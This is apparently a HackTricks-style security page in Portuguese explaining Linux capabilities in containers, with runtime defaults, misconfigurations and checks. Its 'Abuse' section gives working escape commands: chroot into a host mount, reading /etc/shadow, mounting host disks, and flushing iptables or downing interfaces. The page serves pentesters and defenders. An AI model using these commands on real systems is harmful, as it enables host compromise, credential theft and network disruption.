# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux capabilities são uma das partes mais importantes da segurança de containers porque respondem a uma pergunta sutil, mas fundamental: **o que "root" realmente significa dentro de um container?** Em um sistema Linux normal, o UID 0 historicamente implicava um conjunto de privilégios muito amplo. Nos kernels modernos, esse privilégio é dividido em unidades menores chamadas capabilities. Um processo pode ser executado como root e ainda assim não ter muitas operações poderosas se as capabilities relevantes tiverem sido removidas.

Os containers dependem bastante dessa distinção. Muitas workloads ainda são iniciadas como UID 0 dentro do container por motivos de compatibilidade ou simplicidade. Sem o dropping de capabilities, isso seria perigoso demais. Com o dropping de capabilities, um processo root dentro de um container ainda pode executar muitas tarefas comuns dentro do container, enquanto tem operações mais sensíveis do kernel negadas. É por isso que um shell de container que mostra `uid=0(root)` não significa automaticamente "host root" ou sequer "privilégio amplo no kernel". Os conjuntos de capabilities determinam quanto essa identidade root realmente vale.

Para obter a referência completa das capabilities do Linux e vários exemplos de abuso, consulte:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operation

As capabilities são rastreadas em vários conjuntos, incluindo permitted, effective, inheritable, ambient e bounding sets. Para muitas avaliações de containers, a semântica exata de cada conjunto no kernel é menos importante inicialmente do que a questão prática final: **quais operações privilegiadas este processo consegue executar com sucesso agora e quais ganhos futuros de privilégio ainda são possíveis?**

Isso é importante porque muitas técnicas de breakout são, na realidade, problemas de capabilities disfarçados de problemas de containers. Uma workload com `CAP_SYS_ADMIN` pode acessar uma enorme quantidade de funcionalidades do kernel que um processo root normal de container não deveria tocar. Uma workload com `CAP_NET_ADMIN` se torna muito mais perigosa se também compartilhar o network namespace do host. Uma workload com `CAP_SYS_PTRACE` se torna muito mais interessante se puder visualizar processos do host por meio do compartilhamento do PID namespace do host. No Docker ou Podman, isso pode aparecer como `--pid=host`; no Kubernetes, normalmente aparece como `hostPID: true`.

Em outras palavras, o conjunto de capabilities não pode ser avaliado isoladamente. Ele precisa ser analisado em conjunto com namespaces, seccomp e a política MAC.

## Lab

Uma forma muito direta de inspecionar as capabilities dentro de um container é:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Você também pode comparar um container mais restritivo com um que tenha todas as capabilities adicionadas:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver o efeito de uma adição restrita, tente remover tudo e adicionar novamente apenas uma capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Esses pequenos experimentos ajudam a demonstrar que um runtime não está simplesmente alternando um booleano chamado "privileged". Ele está moldando a superfície de privilégios efetivamente disponível para o processo.

## Capabilities de Alto Risco

Embora muitas capabilities possam ser relevantes dependendo do alvo, algumas aparecem repetidamente na análise de container escape.

**`CAP_SYS_ADMIN`** é a capability que os defenders devem observar com mais suspeita. Ela é frequentemente descrita como "the new root" porque desbloqueia uma enorme quantidade de funcionalidades, incluindo operações relacionadas a mount, comportamentos sensíveis a namespaces e muitos caminhos do kernel que jamais deveriam ser expostos casualmente a containers. Se um container tiver `CAP_SYS_ADMIN`, um seccomp fraco e nenhuma forte contenção por MAC, muitos caminhos clássicos de breakout se tornam muito mais realistas.

**`CAP_SYS_PTRACE`** é importante quando existe visibilidade de processos, especialmente se o PID namespace for compartilhado com o host ou com workloads vizinhos interessantes. Ela pode transformar visibilidade em tampering.

**`CAP_NET_ADMIN`** e **`CAP_NET_RAW`** são importantes em ambientes focados em rede. Em uma bridge network isolada, elas já podem ser arriscadas; em um host network namespace compartilhado, são muito piores, pois o workload pode conseguir reconfigurar a rede do host, fazer sniffing, spoofing ou interferir nos fluxos de tráfego locais.

**`CAP_SYS_MODULE`** geralmente é catastrófica em um ambiente rootful, pois carregar kernel modules equivale efetivamente a controlar o host kernel. Ela quase nunca deveria aparecer em um workload de container de uso geral.

## Uso pelo Runtime

Docker, Podman, stacks baseadas em containerd e CRI-O usam controles de capabilities, mas os defaults e as interfaces de gerenciamento diferem. O Docker as expõe diretamente por meio de flags como `--cap-drop` e `--cap-add`. O Podman oferece controles semelhantes e frequentemente se beneficia da execução rootless como uma camada adicional de segurança. O Kubernetes expõe adições e remoções de capabilities por meio do `securityContext` do Pod ou do container. Ambientes de system containers, como LXC/Incus, também dependem do controle de capabilities, mas a integração mais ampla desses sistemas com o host frequentemente leva operators a relaxar os defaults de forma mais agressiva do que fariam em um ambiente de app containers.

O mesmo princípio se aplica a todos eles: uma capability que é tecnicamente possível conceder não é necessariamente uma capability que deveria ser concedida. Muitos incidentes reais começam quando um operator adiciona uma capability simplesmente porque um workload falhou sob uma configuração mais restritiva e a equipe precisava de uma correção rápida.

## Misconfigurations

O erro mais óbvio é **`--cap-add=ALL`** em CLIs no estilo Docker/Podman, mas não é o único. Na prática, um problema mais comum é conceder uma ou duas capabilities extremamente poderosas, especialmente `CAP_SYS_ADMIN`, para "fazer a aplicação funcionar", sem também compreender as implicações relacionadas a namespaces, seccomp e mounts. Outro modo comum de falha é combinar capabilities adicionais com o compartilhamento de host namespaces. No Docker ou Podman, isso pode aparecer como `--pid=host`, `--network=host` ou `--userns=host`; no Kubernetes, a exposição equivalente geralmente aparece por meio de configurações do workload, como `hostPID: true` ou `hostNetwork: true`. Cada uma dessas combinações altera o que a capability pode efetivamente afetar.

Também é comum ver administradores acreditarem que, como um workload não está totalmente `--privileged`, ele ainda está significativamente restrito. Às vezes isso é verdade, mas às vezes a postura efetiva já está próxima o suficiente de privileged para que a distinção deixe de importar operacionalmente.

## Abuse

O primeiro passo prático é enumerar o conjunto efetivo de capabilities e testar imediatamente as ações específicas dessas capabilities que seriam relevantes para escape ou acesso a informações do host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Se `CAP_SYS_ADMIN` estiver presente, teste primeiro o abuso baseado em mount e o acesso ao sistema de arquivos do host, pois este é um dos facilitadores de breakout mais comuns:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Se `CAP_SYS_PTRACE` estiver presente e o container puder ver processos interessantes, verifique se a capability pode ser usada para realizar inspeção de processos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Se `CAP_NET_ADMIN` ou `CAP_NET_RAW` estiver presente, teste se o workload pode manipular a pilha de rede visível ou, pelo menos, coletar informações úteis sobre a rede:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Quando um teste de capability é bem-sucedido, combine-o com a situação dos namespaces. Uma capability que parece apenas arriscada em um namespace isolado pode se tornar imediatamente um escape ou uma primitiva de host-recon quando o container também compartilha o PID do host, a rede do host ou os mounts do host.

### Exemplo completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Se o container tiver `CAP_SYS_ADMIN` e um bind mount gravável do sistema de arquivos do host, como `/host`, o caminho de escape geralmente será simples:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Se `chroot` for bem-sucedido, os comandos agora são executados no contexto do sistema de arquivos raiz do host:
```bash
id
hostname
cat /etc/shadow | head
```
Se `chroot` não estiver disponível, o mesmo resultado pode frequentemente ser obtido chamando o binário através da árvore montada:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Exemplo completo: `CAP_SYS_ADMIN` + acesso a dispositivos

Se um dispositivo de bloco do host for exposto, `CAP_SYS_ADMIN` pode transformá-lo em acesso direto ao sistema de arquivos do host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Exemplo Completo: `CAP_NET_ADMIN` + Host Networking

Essa combinação nem sempre produz diretamente root no host, mas pode reconfigurar completamente a pilha de rede do host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Isso pode permitir denial of service, interceptação de tráfego ou acesso a serviços que antes eram filtrados.

## Verificações

O objetivo das verificações de capabilities não é apenas despejar valores brutos, mas entender se o processo tem privilégios suficientes para tornar perigosas a configuração atual de seu namespace e a situação dos mounts.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
O que é interessante aqui:

- `capsh --print` é a maneira mais fácil de identificar capabilities de alto risco, como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
- A linha `CapEff` em `/proc/self/status` informa o que está efetivamente ativo agora, e não apenas o que pode estar disponível em outros conjuntos.
- Um dump de capabilities se torna muito mais importante se o container também compartilha namespaces de PID, network ou user do host, ou possui mounts do host com permissão de escrita.

Depois de coletar as informações brutas sobre as capabilities, o próximo passo é a interpretação. Verifique se o processo é root, se user namespaces estão ativos, se namespaces do host são compartilhados, se o seccomp está sendo aplicado e se o AppArmor ou SELinux ainda restringe o processo. Um conjunto de capabilities, por si só, é apenas parte da história, mas geralmente é a parte que explica por que um container breakout funciona e outro falha com o mesmo ponto de partida aparente.

## Padrões do Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capabilities reduzido por padrão | O Docker mantém uma allowlist padrão de capabilities e remove as demais | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capabilities reduzido por padrão | Os containers do Podman não são privilegiados por padrão e usam um modelo de capabilities reduzido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Herda os padrões do runtime, a menos que sejam alterados | Se nenhum `securityContext.capabilities` for especificado, o container recebe o conjunto padrão de capabilities do runtime | `securityContext.capabilities.add`, não usar `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O no Kubernetes | Geralmente o padrão do runtime | O conjunto efetivo depende do runtime e da especificação do Pod | igual à linha do Kubernetes; a configuração direta de OCI/CRI também pode adicionar capabilities explicitamente |

Para o Kubernetes, o ponto importante é que a API não define um único conjunto universal padrão de capabilities. Se o Pod não adicionar nem remover capabilities, o workload herda o padrão do runtime desse node.
{{#include ../../../../banners/hacktricks-training.md}}
